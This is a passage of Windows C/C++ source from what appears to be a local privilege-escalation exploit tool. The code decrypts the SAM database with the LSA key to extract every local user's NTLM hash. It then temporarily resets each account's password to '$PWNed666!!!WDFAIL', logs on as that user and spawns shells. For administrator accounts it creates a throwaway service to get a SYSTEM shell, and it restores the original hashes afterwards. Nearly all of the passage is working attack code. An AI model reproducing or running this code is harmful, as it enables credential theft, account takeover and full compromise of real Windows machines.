	memmove(hashdata, &data[0x18 + enclen], hashlen);

	char* hash = (char*)UnprotectAES(lsaKey, iv, hashdata, hashlen, &outsz);
	free(hashdata);

	char hash256[SHA256_DIGEST_LENGTH];

	if (!ComputeSHA256(pek, pekoutsz, hash256))
	{
		free(hash);
		free(pek);
		return NULL;
	}

	if (memcmp(hash256, hash, sizeof(hash256)) != 0)
	{
		//printf("Invalid AES password key.\n");
		free(hash);
		free(pek);
		return NULL;
	}
	free(hash);
	if (keysz)
		*keysz = sizeof(hash256);


	return pek;

}

void* UnprotectPasswordEncryptionKey(char* samKey, unsigned char* lsaKey, int* keysz)
{

	int enctype = samKey[0x68];
	if (enctype == 2) {
		int endofs = samKey[0x6c] + 0x68;
		int len = endofs - 0x70;

		char* data = (char*)malloc(len);
		memmove(data, &samKey[0x70], len);
		void* retval = UnprotectPasswordEncryptionKeyAES(data, (char*)lsaKey, keysz);
		free(data);
		return retval;
	}
	__debugbreak();
	return NULL;

}

void* UnprotectPasswordHashAES(char* key, int keysz, char* data, int datasz, int* outsz)
{
	int length = data[4];
	if (!length)
		return NULL;
	char iv[16] = { 0 };
	memmove(iv, &data[8], sizeof(iv));

	int ciphertextsz = datasz - 24;
	char* ciphertext = (char*)malloc(ciphertextsz);
	memmove(ciphertext, &data[8 + sizeof(iv)], ciphertextsz);
	void* result = UnprotectAES(key, iv, ciphertext, ciphertextsz, outsz);
	free(ciphertext);
	return result;
}

void* UnprotectPasswordHash(char* key, int keysz, char* data, int datasz, ULONG rid, int* outsz)
{
	int enctype = data[2];

	switch (enctype)
	{
	case 2:

		return UnprotectPasswordHashAES(key, keysz, data, datasz, outsz);

		break;
	default:
		__debugbreak();
		break;
	}

	return NULL;


}

void* UnprotectDES(char* key, int keysz, char* ciphertext, int ciphertextsz, int* outsz)
{
	
	char* ciphertext2 = (char*)malloc(ciphertextsz);
	memmove(ciphertext2, ciphertext, ciphertextsz);
	HCRYPTPROV hprov = NULL;
	CryptAcquireContext(&hprov, 0, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);

	struct deskeyBlob
	{
		BLOBHEADER hdr;
		DWORD keySize;
		BYTE bytes[8];
	}blob;
	//deskeyBlob* blob = (deskeyBlob*)malloc(sizeof(deskeyBlob) + keysz);
	blob.hdr.bType = PLAINTEXTKEYBLOB;
	blob.hdr.bVersion = CUR_BLOB_VERSION;
	blob.hdr.reserved = 0;
	blob.hdr.aiKeyAlg = CALG_DES;
	blob.keySize = 8;
	memmove(blob.bytes, key, 8);
	HCRYPTKEY hcryptkey = NULL;
	CryptImportKey(hprov, (const BYTE*)&blob, sizeof(deskeyBlob), NULL, NULL, &hcryptkey);

	DWORD mode = CRYPT_MODE_ECB;
	CryptSetKeyParam(hcryptkey, KP_MODE, (const BYTE*)&mode, NULL);

	DWORD retsz = ciphertextsz;

	CryptDecrypt(hcryptkey, NULL, TRUE, CRYPT_DECRYPT_RSA_NO_PADDING_CHECK, (BYTE*)ciphertext2, &retsz);

	if (outsz)
		*outsz = 8;

	CryptDestroyKey(hcryptkey);
	CryptReleaseContext(hprov, NULL);
	return ciphertext2;

	/*
	DWORD mode = CRYPT_MODE_ECB;
	CryptSetKeyParam(hcryptkey, KP_MODE, (const BYTE*)&mode, NULL);
	//printf("GetLastError : %x\n", GetLastError());

	DWORD retsz = enclen;

	CryptDecrypt(hcryptkey, NULL, TRUE, CRYPT_DECRYPT_RSA_NO_PADDING_CHECK, (BYTE*)decrypted, &retsz);
	//printf("GetLastError : %x\n", GetLastError());
	*/
	/*
	OSSL_PROVIDER* legacy = OSSL_PROVIDER_load(NULL, "legacy");
	if (legacy == NULL)
	{
		//printf("Failed to load Legacy provider\n");
	}
	
	EVP_CIPHER_CTX* en = EVP_CIPHER_CTX_new();

	int fulllen = 0;
	int retval = EVP_DecryptInit_ex(en, EVP_des_ecb(), NULL, (const unsigned char*)key, NULL);

	char* plaintext = (char*)malloc(ciphertextsz);
	int _outsz = 0;
	retval = EVP_DecryptUpdate(en, (unsigned char*)plaintext, &_outsz, (const unsigned char*)ciphertext, ciphertextsz);
	int _outlen = 0;
	retval = EVP_DecryptFinal_ex(en, (unsigned char*)plaintext + _outsz, &_outlen);

	if (outsz)
		*outsz = _outsz;

	return plaintext;
	*/
}

char* DeriveDESKey(char data[7])
{
	const int DATA_LEN = 7;

	union keyderv {
		struct {
			char arr[8];
		};
		SIZE_T derv;
	};
	keyderv ttv = { 0 };
	ZeroMemory(ttv.arr, sizeof(ttv.arr));
	memmove(ttv.arr, data, DATA_LEN);
	SIZE_T k = ttv.derv;


	char* key = (char*)malloc(8);

	for (int i = 0; i < 8; i++)
	{
		int j = 7 - i;
		int curr = (k >> (7 * j)) & 0x7F;
		int b = curr;
		b ^= b >> 4;
		b ^= b >> 2;
		b ^= b >> 1;
		int keybyte = (curr << 1) ^ (b & 1) ^ 1;
		key[i] = (char)keybyte;
	}
	return key;
}

void* UnproctectPasswordHashDES(char* ciphertext, int ciphersz, int* outsz, ULONG rid)
{

	union keydata {
		struct {
			char a;
			char b;
			char c;
			char d;
		};
		ULONG data;
	};

	keydata keycontent = { 0 };
	keycontent.data = rid;
	char key1[7] = { keycontent.c,keycontent.b,keycontent.a,keycontent.d, keycontent.c, keycontent.b,keycontent.a };
	char key2[7] = { keycontent.b,keycontent.a,keycontent.d,keycontent.c, keycontent.b, keycontent.a,keycontent.d };

	char* rkey1 = DeriveDESKey(key1);
	char* rkey2 = DeriveDESKey(key2);


	int plaintext1sz = 0;
	int plaintext2sz = 0;
	char* plaintext1 = (char*)UnprotectDES(rkey1, sizeof(key1), ciphertext, ciphersz, &plaintext1sz);
	free(rkey1);
	if (!plaintext1)
	{
		free(rkey2);
		return NULL;
	}
	char* plaintext2 = (char*)UnprotectDES(rkey2, sizeof(key2), &ciphertext[8], ciphersz, &plaintext2sz);
	free(rkey2);
	if (!plaintext2)
	{
		free(plaintext1);
		return NULL;
	}
	void* retval = malloc(plaintext1sz + plaintext2sz);

	memmove(retval, plaintext1, plaintext1sz);
	memmove(RtlOffsetToPointer(retval, plaintext1sz), plaintext2, plaintext2sz);
	free(plaintext1);
	free(plaintext2);
	if (outsz)
		*outsz = plaintext1sz + plaintext2sz;
	return retval;
}

void* UnprotectNTHash(char* key, int keysz, char* encryptedHash, int enchashsz, int* outsz, ULONG rid)
{
	int _outsz = 0;
	void* dec = UnprotectPasswordHash(key, keysz, encryptedHash, enchashsz, rid, &_outsz);
	if (!dec)
		return NULL;
	int _hashoutsz = 0;
	void* _hash = UnproctectPasswordHashDES((char*)dec, _outsz, &_hashoutsz, rid);
	free(dec);
	if (outsz)
		*outsz = _hashoutsz;
	return _hash;
}

unsigned char* HexToHexString(unsigned char* data, int size)
{
	unsigned char* retval = (unsigned char*)malloc(size * 2 + 1);
	ZeroMemory(retval, size * 2 + 1);
	for (int i = 0; i < size; i++)
	{
		sprintf((char*)&retval[i * 2], "%02x", data[i]);
	}

	return retval;
}

#define SAM_DATABASE_DATA_ACCESS_OFFSET 0xcc
#define SAM_DATABASE_USERNAME_OFFSET 0x0c
#define SAM_DATABASE_USERNAME_LENGTH_OFFSET 0x10
#define SAM_DATABASE_LM_HASH_OFFSET 0x9c
#define SAM_DATABASE_LM_HASH_LENGTH_OFFSET 0xa0
#define SAM_DATABASE_NT_HASH_OFFSET 0xa8
#define SAM_DATABASE_NT_HASH_LENGTH_OFFSET 0xac

struct PwdEnc
{
	char* buff;
	size_t sz;
	wchar_t* username;
	ULONG usernamesz;
	char* LMHash;
	ULONG LMHashLenght;
	char* NTHash;
	ULONG NTHashLenght;
	ULONG rid;

};


NTSTATUS WINAPI SamConnect(IN PUNICODE_STRING ServerName, OUT HANDLE* ServerHandle, IN ACCESS_MASK DesiredAccess, IN BOOLEAN Trusted);
NTSTATUS WINAPI SamCloseHandle(IN HANDLE SamHandle);
NTSTATUS WINAPI SamOpenDomain(IN HANDLE SamHandle, IN ACCESS_MASK DesiredAccess, IN PSID DomainId, OUT HANDLE* DomainHandle);
NTSTATUS WINAPI SamOpenUser(IN HANDLE DomainHandle, IN ACCESS_MASK DesiredAccess, IN DWORD UserId, OUT HANDLE* UserHandle);
NTSTATUS WINAPI SamiChangePasswordUser(IN HANDLE UserHandle, IN BOOL isOldLM, IN const BYTE* oldLM, IN const BYTE* newLM, IN BOOL isNewNTLM, IN const BYTE* oldNTLM, IN const BYTE* newNTLM);


char* CalculateNTLMHash(char* _input)
{

	int pw_len = strlen(_input);
	char* input = new char[pw_len * 2];
	for (int i = 0; i < pw_len; i++)
	{
		input[i * 2] = _input[i];
		input[i * 2 + 1] = '\0';
	}

	
	unsigned int md_len = 0;

	HCRYPTPROV hprov = NULL;

	CryptAcquireContext(&hprov, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);

	HCRYPTHASH Hhash = NULL;
	CryptCreateHash(hprov, CALG_MD4, NULL, NULL, &Hhash);

	CryptHashData(Hhash, (const BYTE*)input, pw_len * 2, NULL);

	DWORD inputsz = sizeof(md_len);
	CryptGetHashParam(Hhash, HP_HASHSIZE, (BYTE*)&md_len, &inputsz, NULL);
	unsigned char* md_value = (unsigned char*)malloc(md_len);
	inputsz = md_len;
	CryptGetHashParam(Hhash, HP_HASHVAL, (BYTE*)md_value, &inputsz, NULL);

	CryptDestroyHash(Hhash);
	CryptReleaseContext(hprov, NULL);
	delete[] input;
	return (char*)md_value;

}
bool ChangeUserPassword(wchar_t* username, void* nthash, char* newpassword, char* newNTLMHash = NULL)
{

	wchar_t libpath[MAX_PATH] = { 0 };
	ExpandEnvironmentStrings(L"%windir%\\System32\\samlib.dll",libpath,MAX_PATH);

	HMODULE hm = LoadLibrary(libpath);
	if (!hm)
	{
		//printf("Failed to load samlib.dll\n");
		return false;
	}
	NTSTATUS(WINAPI * _SamConnect)
		(IN PUNICODE_STRING ServerName, OUT HANDLE * ServerHandle, IN ACCESS_MASK DesiredAccess, IN BOOLEAN Trusted) = (NTSTATUS(WINAPI*)(IN PUNICODE_STRING ServerName, OUT HANDLE * ServerHandle, IN ACCESS_MASK DesiredAccess, IN BOOLEAN Trusted))GetProcAddress(hm, "SamConnect");
	NTSTATUS(WINAPI * _SamCloseHandle)(IN HANDLE SamHandle) = (NTSTATUS(WINAPI*)(IN HANDLE SamHandle))GetProcAddress(hm, "SamCloseHandle");
	NTSTATUS(WINAPI * _SamOpenDomain)(IN HANDLE SamHandle, IN ACCESS_MASK DesiredAccess, IN PSID DomainId, OUT HANDLE * DomainHandle)
		= (NTSTATUS(WINAPI*)(IN HANDLE SamHandle, IN ACCESS_MASK DesiredAccess, IN PSID DomainId, OUT HANDLE * DomainHandle))GetProcAddress(hm, "SamOpenDomain");
	NTSTATUS(WINAPI * _SamOpenUser)(IN HANDLE DomainHandle, IN ACCESS_MASK DesiredAccess, IN DWORD UserId, OUT HANDLE * UserHandle) = (NTSTATUS(WINAPI*)(IN HANDLE DomainHandle, IN ACCESS_MASK DesiredAccess, IN DWORD UserId, OUT HANDLE * UserHandle))GetProcAddress(hm, "SamOpenUser");
	NTSTATUS(WINAPI * _SamiChangePasswordUser)(IN HANDLE UserHandle, IN BOOL isOldLM, IN const BYTE * oldLM, IN const BYTE * newLM, IN BOOL isNewNTLM, IN const BYTE * oldNTLM, IN const BYTE * newNTLM) = (NTSTATUS(WINAPI*)(IN HANDLE UserHandle, IN BOOL isOldLM, IN const BYTE * oldLM, IN const BYTE * newLM, IN BOOL isNewNTLM, IN const BYTE * oldNTLM, IN const BYTE * newNTLM))GetProcAddress(hm, "SamiChangePasswordUser");


	if (!_SamConnect || !_SamCloseHandle || !_SamOpenDomain || !_SamOpenUser || !_SamiChangePasswordUser)
	{
		//printf("Failed to import required functions from samlib.dll\n");
		return false;
	}

	HANDLE hsrv = NULL;
	NTSTATUS stat = _SamConnect(NULL, &hsrv, MAXIMUM_ALLOWED, false);
	if (stat)
	{
		//printf("Failed to connect to SAM, error : 0x%0.8X\n", stat);
		return false;
	}
	////printf("Connected to local SAM.\n");
	LSA_OBJECT_ATTRIBUTES loa = { 0 };
	LSA_HANDLE hlsa = NULL;
	stat = LsaOpenPolicy(NULL, &loa, MAXIMUM_ALLOWED, &hlsa);
	if (stat)
	{
		//printf("LsaOpenPolicy failed, error : 0x%0.8X\n", stat);
		return false;
	}
	
	POLICY_ACCOUNT_DOMAIN_INFO* domaininfo = 0;
	stat = LsaQueryInformationPolicy(hlsa, PolicyAccountDomainInformation, (PVOID*)&domaininfo);
	if (stat)
	{
		//printf("LsaQueryInformationPolicy failed, error : 0x%0.8X\n", stat);
		return false;
	}
	/*wchar_t* stringsid = 0;
	if (!ConvertSidToStringSid(domaininfo->DomainSid, &stringsid))
	{
		//printf("Failed to get string sid, error : %d\n", GetLastError());
		return false;
	}
	//printf("Machine SID : %ws\n", stringsid);*/
	LSA_REFERENCED_DOMAIN_LIST* lsareflist = 0;
	LSA_TRANSLATED_SID* lsatrans = 0;
	LSA_UNICODE_STRING lsaunistr = { 0 };
	RtlInitUnicodeString((PUNICODE_STRING)&lsaunistr, username);
	stat = LsaLookupNames(hlsa, 1, &lsaunistr, &lsareflist, &lsatrans);
	if (stat)
	{
		//printf("LsaLookupNames failed, error : 0x%0.8X\n", stat);
		return false;
	}
	LsaClose(hlsa);
	
	HANDLE hdomain = NULL;
	stat = _SamOpenDomain(hsrv, MAXIMUM_ALLOWED, domaininfo->DomainSid, &hdomain);
	if (stat)
	{
		//printf("SamOpenDomain failed, error : 0x%0.8X\n", stat);
		return false;
	}

	HANDLE huser = NULL;
	stat = _SamOpenUser(hdomain, MAXIMUM_ALLOWED, lsatrans->RelativeId, &huser);
	if (stat)
	{
		//printf("SamOpenUser failed, error : 0x%0.8X\n", stat);
		return false;
	}

	//char password[] = "testp";
	//char* oldNTLM = CalculateNTLMHash((char*)"testp");
	char* oldNTLM = (char*)nthash;
	char* newNTLM = newNTLMHash ? newNTLMHash : CalculateNTLMHash(newpassword);

	char oldLm[16] = { 0 };
	char newLm[16] = { 0 };
	stat = _SamiChangePasswordUser(huser, false, (BYTE*)oldLm, (BYTE*)newLm, true, (BYTE*)oldNTLM, (BYTE*)newNTLM);

	if (stat)
	{
		//printf("SamiChangePasswordUser failed, error : 0x%0.8X\n", stat);
		return false;
	}
	_SamCloseHandle(huser);
	_SamCloseHandle(hdomain);
	_SamCloseHandle(hsrv);
	/*
	if (newpassword) {
		//printf("Info : user \"%ws\" password has changed to %s\n", username, newpassword);
	}
	else {
		//printf("Info : user \"%ws\" password has been changed back to older password\n", username);
	}
	*/
	return true;
}



typedef struct _SYSTEM_PROCESS_INFORMATION2
{
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER WorkingSetPrivateSize; // since VISTA
	ULONG HardFaultCount; // since WIN7
	ULONG NumberOfThreadsHighWatermark; // since WIN7
	ULONGLONG CycleTime; // since WIN7
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE UniqueProcessId;
	HANDLE InheritedFromUniqueProcessId;
	ULONG HandleCount;
	ULONG SessionId;
	ULONG_PTR UniqueProcessKey; // since VISTA (requires SystemExtendedProcessInformation)
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	LARGE_INTEGER ReadTransferCount;
	LARGE_INTEGER WriteTransferCount;
	LARGE_INTEGER OtherTransferCount;
	SYSTEM_THREAD_INFORMATION Threads[1]; // SystemProcessInformation
	// SYSTEM_EXTENDED_THREAD_INFORMATION Threads[1]; // SystemExtendedProcessinformation
	// SYSTEM_EXTENDED_THREAD_INFORMATION + SYSTEM_PROCESS_INFORMATION_EXTENSION // SystemFullProcessInformation
} SYSTEM_PROCESS_INFORMATION2, * PSYSTEM_PROCESS_INFORMATION2;

BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		//printf("LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		0,
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		//printf("AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		//printf("The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}


// Global shell binary — set by --shell flag in wmain
const wchar_t* g_ShellBinary = L"C:\\Windows\\System32\\conhost.exe";

bool DoSpawnShellAsAllUsers(wchar_t* sampath)
{
	//SSL_library_init();
	//SSL_load_error_strings();
	char newpassword[] = "$PWNed666!!!WDFAIL";
	wchar_t newpassword_unistr[] = L"$PWNed666!!!WDFAIL";
	char* newNTLM = CalculateNTLMHash(newpassword);
	bool isadmin = false;
	char* retval = 0;
	ORHKEY hSAMhive = NULL;
	ORHKEY hSYSTEMhive = NULL;
	DWORD err = OROpenHive(sampath, &hSAMhive);
	bool systemshelllaunched = false;
	if (err)
	{
		//printf("OROpenHive failed with error : %d\n", err);
		return false;
	}

	unsigned char lsakey[16] = { 0 };

	if (!GetLSASecretKey(lsakey))
	{
		//printf("Failed to dump LSA secret keys.\n");
		return false;
	}


	ORHKEY hkey = NULL;
	err = OROpenKey(hSAMhive, L"SAM\\Domains\\Account", &hkey);

	DWORD valuesz = 0;
	err = ORGetValue(hkey, NULL, L"F", NULL, NULL, &valuesz);
	if (err)
	{
		//printf("ORGetValue failed with error : %d\n", err);
		return false;
	}
	char* samkey = (char*)malloc(valuesz);
	err = ORGetValue(hkey, NULL, L"F", NULL, samkey, &valuesz);
	if (err)
	{
		//printf("ORGetValue failed with error : %d\n", err);
		return false;
	}

	ORCloseKey(hkey);

	///////////////////////////////////////////////////////////
	int passwordEncryptionKeysz = 0;
	char* passwordEncryptionKey = (char*)UnprotectPasswordEncryptionKey(samkey, lsakey, &passwordEncryptionKeysz);

	err = OROpenKey(hSAMhive, L"SAM\\Domains\\Account\\Users", &hkey);
	if (err)
	{
		//printf("OROpenKey failed with error : %d\n", err);
		return false;
	}

	
	DWORD subkeys = NULL;
	err = ORQueryInfoKey(hkey, NULL, NULL, &subkeys, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (err)
	{
		//printf("ORQueryInfoKey failed with error : %d\n", err);
		return false;
	}


	PwdEnc** pwdenclist = (PwdEnc**)malloc(sizeof(PwdEnc*) * subkeys);
	int numofentries = 0;
	for (int i = 0; i < subkeys; i++)
	{
		DWORD keynamesz = 0x100;
		wchar_t keyname[0x100] = { 0 };
		err = OREnumKey(hkey, i, keyname, &keynamesz, NULL, NULL, NULL);
		if (err)
		{
			//printf("OREnumKey failed with error : %d\n", err);
			return false;
		}
		if (_wcsicmp(keyname, L"users") == 0)
			continue;
		ORHKEY hkey2 = NULL;
		err = OROpenKey(hkey, keyname, &hkey2);
		if (err)
		{
			//printf("OROpenKey failed with error : %d\n", err);
			return false;
		}
		DWORD valuesz = 0;
		err = ORGetValue(hkey2, NULL, L"V", NULL, NULL, &valuesz);
		if (err == ERROR_FILE_NOT_FOUND)
			continue;
		if (err != ERROR_MORE_DATA && err != ERROR_SUCCESS) {
			//printf("ORGetValue failed with error : %d\n", err);
			return false;
		}
		PwdEnc* SAMpwd = (PwdEnc*)malloc(sizeof(PwdEnc));
		ZeroMemory(SAMpwd, sizeof(PwdEnc));
		SAMpwd->sz = valuesz;
		SAMpwd->buff = (char*)malloc(valuesz);
		ZeroMemory(SAMpwd->buff, valuesz);
		err = ORGetValue(hkey2, NULL, L"V", NULL, SAMpwd->buff, &valuesz);
		if (err)
		{
			//printf("ORGetValue failed with error : %d\n", err);
			return false;
		}
		SAMpwd->rid = wcstoul(keyname, NULL, 16);

		ULONG* accnameoffset = (ULONG*)&SAMpwd->buff[SAM_DATABASE_USERNAME_OFFSET];
		SAMpwd->username = (wchar_t*)RtlOffsetToPointer(SAMpwd->buff, *accnameoffset + SAM_DATABASE_DATA_ACCESS_OFFSET);
		ULONG* usernamesz = (ULONG*)&SAMpwd->buff[SAM_DATABASE_USERNAME_LENGTH_OFFSET];
		SAMpwd->usernamesz = *usernamesz;

		ULONG* LMhashoffset = (ULONG*)&SAMpwd->buff[SAM_DATABASE_LM_HASH_OFFSET];
		SAMpwd->LMHash = (char*)RtlOffsetToPointer(SAMpwd->buff, *LMhashoffset + SAM_DATABASE_DATA_ACCESS_OFFSET);
		ULONG* LMhashsz = (ULONG*)&SAMpwd->buff[SAM_DATABASE_LM_HASH_LENGTH_OFFSET];
		SAMpwd->LMHashLenght = *LMhashsz;

		ULONG* NTHashoffset = (ULONG*)&SAMpwd->buff[SAM_DATABASE_NT_HASH_OFFSET];
		SAMpwd->NTHash = (char*)RtlOffsetToPointer(SAMpwd->buff, *NTHashoffset + SAM_DATABASE_DATA_ACCESS_OFFSET);
		ULONG* NThashsz = (ULONG*)&SAMpwd->buff[SAM_DATABASE_NT_HASH_LENGTH_OFFSET];
		SAMpwd->NTHashLenght = *NThashsz;

		pwdenclist[i] = SAMpwd;
		numofentries++;
	}


	wchar_t currentusername[UNLEN + 1] = { 0 };
	DWORD usernamesz = sizeof(currentusername) / sizeof(wchar_t);
	if (!GetUserName(currentusername, &usernamesz))
	{
		//printf("Failed to get current user name, error : %d", GetLastError());
		return false;
	}


	for (int i = 0; i < numofentries; i++)
	{
		PwdEnc* samentry = pwdenclist[i];
		int realNTLMHashsz = 0;
		char* realNTLMHash = (char*)UnprotectNTHash(passwordEncryptionKey, passwordEncryptionKeysz, samentry->NTHash, samentry->NTHashLenght, &realNTLMHashsz, samentry->rid);
		char* stringntlm = 0;
		char emptyrepresentation[] = "{NULL}";
		if (realNTLMHashsz)
		{
			stringntlm = (char*)HexToHexString((unsigned char*)realNTLMHash, realNTLMHashsz);
		}
		else
		{

			stringntlm = emptyrepresentation;
		}
		wchar_t username[UNLEN + 1] = { 0 };
		if (samentry->usernamesz <= sizeof(username))
		{
			memmove(username, samentry->username, samentry->usernamesz);
		}
		//printf("******************************************\n");
		//printf("    User : %ws\n    RID : %d\n    NTLM : %s\n", username, samentry->rid, stringntlm);
		if (stringntlm && stringntlm != emptyrepresentation)
			free(stringntlm);
		if (realNTLMHash == NULL || realNTLMHashsz == 0) {
			//printf("    Skip : NULL NTLM.\n");
			continue;
		}
		if (_wcsicmp(username, currentusername) == 0)
		{
			//printf("    Skip : Current User.\n");
			free(realNTLMHash);
			continue;
		}
		if (_wcsicmp(username, L"WDAGUtilityAccount") == 0)
		{
			//printf("    Skip : WDAGUtilityAccount detected.\n");
			free(realNTLMHash);
			continue;
		}
		
			retval = realNTLMHash;

			if (ChangeUserPassword(username, realNTLMHash, NULL,newNTLM))
			{
				//printf("    NewPasswordSet : OK.\n");

				HANDLE htoken = NULL;
				PSID logonsid = 0;
				if (!LogonUserEx(username, NULL, newpassword_unistr, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &htoken, &logonsid, NULL, NULL, NULL))
				{
					//printf("LogonUserEx failed, error : %d\n", GetLastError());
				}
				if (!systemshelllaunched) {
					TOKEN_ELEVATION_TYPE tokentype;
					DWORD retsz = 0;
					if (!GetTokenInformation(htoken, TokenElevationType, &tokentype, sizeof(tokentype), &retsz))
					{
						//printf("GetTokenInformation failed with error : %d\n", GetLastError());
					}

					if (tokentype == TokenElevationTypeLimited)
					{
						TOKEN_LINKED_TOKEN linkedtoken = { 0 };


						if (!GetTokenInformation(htoken, TokenLinkedToken, &linkedtoken, sizeof(TOKEN_LINKED_TOKEN), &retsz))
						{
							//printf("GetTokenInformation failed with error : %d\n", GetLastError());
						}

						HANDLE hdup = linkedtoken.LinkedToken;

						DWORD sidsz = MAX_SID_SIZE;
						PSID administratorssid = malloc(sidsz);

						if (!CreateWellKnownSid(WinBuiltinAdministratorsSid, NULL, administratorssid, &sidsz))
						{
							//printf("Failed to create well known sid, error : %d\n", GetLastError());
						}



						if (!CheckTokenMembership(hdup, administratorssid, (PBOOL)&isadmin))
						{
							//printf("CheckTokenMembership failed with error : %d\n", GetLastError());
						}
						free(administratorssid);

						CloseHandle(hdup);
					}

					if (isadmin)
					{




						//printf("    IsAdmin : TRUE\n");
						HANDLE htoken2 = NULL;
						if (!LogonUserEx(username, NULL, newpassword_unistr, LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, &htoken2, &logonsid, NULL, NULL, NULL))
						{
							//printf("LogonUserEx failed, error : %d\n", GetLastError());
						}
						//SetPrivilege(htoken2, SE_DEBUG_NAME, TRUE);
						const wchar_t sid_string[] = L"S-1-16-8192";
						TOKEN_MANDATORY_LABEL integrity;
						PSID  sid = NULL;
						ConvertStringSidToSidW(sid_string, &sid);
						ZeroMemory(&integrity, sizeof(integrity));
						integrity.Label.Attributes = SE_GROUP_INTEGRITY;
						integrity.Label.Sid = sid;
						if (SetTokenInformation(htoken2, TokenIntegrityLevel, &integrity, sizeof(integrity) + GetLengthSid(sid)) == 0) {
							//wprintf(L"ERROR[SetTokenInformation]: %d\n", GetLastError());
						}
						LocalFree(sid);
						//CloseHandle(htoken2);

						ImpersonateLoggedOnUser(htoken2);


						SC_HANDLE hmgr = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
						if (!hmgr)
						{
							//printf("OpenSCManager failed with error : %d", GetLastError());
						}

						GUID uid = { 0 };
						RPC_WSTR wuid = { 0 };
						wchar_t* wuid2 = 0;

						UuidCreate(&uid);
						UuidToStringW(&uid, &wuid);
						wuid2 = (wchar_t*)wuid;

						wchar_t binpath[MAX_PATH] = { 0 };
						GetModuleFileName(GetModuleHandle(NULL), binpath, MAX_PATH);
						wchar_t servicecmd[MAX_PATH] = { 0 };
						DWORD currentsesid = 0;
						ProcessIdToSessionId(GetCurrentProcessId(), &currentsesid);
						bool useShell = _wcsicmp(g_ShellBinary, L"C:\\Windows\\System32\\cmd.exe") == 0;
						wsprintf(servicecmd, useShell ? L"\"%s\" %d --shell" : L"\"%s\" %d", binpath, currentsesid);

						SC_HANDLE hsvc = CreateService(hmgr, wuid2, wuid2, GENERIC_ALL, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, servicecmd, NULL, NULL, NULL, NULL, NULL);
						if (!hsvc)
						{
							//printf("CreateService Failed with error : %d\n", GetLastError());
						}
						else {
							//printf("    SYSTEMShell : OK.\n");
						}

						StartService(hsvc, NULL, NULL);
						Sleep(100);
						DeleteService(hsvc);
						CloseServiceHandle(hsvc);
						CloseServiceHandle(hmgr);
						RevertToSelf();
						CloseHandle(htoken2);
						systemshelllaunched = true;
					}
					else {
						//printf("    IsAdmin : FALSE\n");
					}


				}

				STARTUPINFO si = { 0 };
				PROCESS_INFORMATION pi = { 0 };
				if (!CreateProcessWithLogonW(username, NULL, newpassword_unistr, LOGON_WITH_PROFILE, g_ShellBinary, NULL, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi))
				{
					//printf("    Shell : Error %d\n", GetLastError());
				}
				else {
					//printf("    Shell : OK.\n");
					if (pi.hProcess)
						CloseHandle(pi.hProcess);
					if (pi.hThread)
						CloseHandle(pi.hThread);
				}

				if (!ChangeUserPassword(username, newNTLM, NULL, realNTLMHash))
				{
					//printf("    PasswordRestore : Error %d\n", GetLastError());
				}
				
				else {
					//printf("    PasswordRestore : OK.\n");
				}
				CloseHandle(htoken);
			}
			
			// __debugbreak();

			free(realNTLMHash);


	}

	// Clean up SAM parsing allocations
	for (int i = 0; i < numofentries; i++)
	{
		if (pwdenclist[i])
		{
			free(pwdenclist[i]->buff);
			free(pwdenclist[i]);
		}
	}
	free(pwdenclist);
	free(samkey);
	free(passwordEncryptionKey);

	ORCloseKey(hkey);
	ORCloseHive(hSAMhive);
	//printf("******************************************\n");
	free(newNTLM);
	return true;



}

bool IsRunningAsLocalSystem()
{

	HANDLE htoken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
		//printf("OpenProcessToken failed, error : %d\n", GetLastError());
		return false;
	}
	TOKEN_USER* tokenuser = (TOKEN_USER*)malloc(MAX_SID_SIZE + sizeof(TOKEN_USER));
	DWORD retsz = 0;
	bool res = GetTokenInformation(htoken, TokenUser, tokenuser, MAX_SID_SIZE + sizeof(TOKEN_USER), &retsz);
	CloseHandle(htoken);
	if (!res)
		return false;

	return IsWellKnownSid(tokenuser->User.Sid, WinLocalSystemSid);
}

void LaunchConsoleInSessionId(DWORD sessionid)
{
	HANDLE htoken = NULL;
